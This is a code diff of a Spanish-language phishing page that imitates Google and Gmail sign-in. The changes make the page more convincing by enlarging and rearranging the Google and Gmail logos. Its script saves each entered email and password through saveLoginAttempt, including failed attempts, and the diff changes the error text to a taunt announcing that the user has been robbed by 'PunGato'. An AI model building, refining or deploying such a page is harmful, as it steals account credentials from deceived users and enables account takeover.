@@ -23,10 +23,18 @@
             width: 400px;
             text-align: center;
         }
-        .login-container img {
-            width: 100px; /* Tamaño de la imagen */
+        .logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px; /* Espacio entre las imágenes */
             margin-bottom: 20px;
-            border-radius: 50%; /* Hace la imagen redonda */
+        }
+        .logo-container img.gmail-logo {
+            width: 120px; /* Tamaño más grande para el logo de Gmail */
+        }
+        .logo-container img.google-logo {
+            width: 80px; /* Tamaño más pequeño para el logo de Google */
         }
         .login-container h1 {
             font-size: 24px;
@@ -99,9 +107,11 @@
 <body>
 
     <div class="login-container">
-        <!-- Nueva imagen -->
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Imagen de perfil">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/768px-Gmail_icon_%282020%29.svg.png" alt="Imagen de perfil">
+        <!-- Contenedor para los logos -->
+        <div class="logo-container">
+            <img class="gmail-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/768px-Gmail_icon_%282020%29.svg.png" alt="Logo de Gmail">
+            <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Logo de Google">
+        </div>
         
         <h1>Iniciar sesión</h1>
         <p>Usa tu cuenta de Google</p>
@@ -192,7 +202,7 @@
                     await saveLoginAttempt(email, password, false);
 
                     // Muestra un mensaje de error al usuario
-                    let errorMessage = "Error al iniciar sesión";
+                    let errorMessage = "Ud. ha sido robado por el PunGato";
                     if (error.code === "auth/user-not-found") {
                         errorMessage = "El usuario no existe";
                     } else if (error.code === "auth/wrong-password") {
